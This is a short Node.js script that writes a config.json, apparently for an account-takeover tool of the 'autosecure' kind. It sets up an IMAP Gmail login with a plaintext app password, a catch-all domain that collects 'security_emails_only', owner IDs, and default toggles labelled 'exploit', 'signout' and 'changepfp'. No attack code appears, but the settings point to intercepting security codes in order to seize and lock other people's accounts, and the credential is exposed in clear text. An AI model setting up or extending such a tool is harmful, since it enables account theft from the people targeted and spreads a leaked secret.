const fs = require('fs');

const config = {
    email: {
        host: "imap.gmail.com",
        port: 993,
        user: "autosecure231@gmail.com",
        password: "tptk ftbt qnzw nnqc",
        checkInterval: 30,
        domain: "inbox.auto-secure.lol",
        useCatchAll: true,
        type: "security_emails_only"
    },
    domains: ["inbox.auto-secure.lol"],
    owners: ["gift_link_user", "691361579417075846589755051895947264"],
    defaultSettings: {
        addzyger: 1,
        changepfp: 0,
        secureifnomc: 1,
        exploit: 1,
        signout: 1
    }
};

fs.writeFileSync('config.json', JSON.stringify(config, null, 2));
console.log('✅ Config.json creado con éxito!');
console.log('📋 Owners:', config.owners);
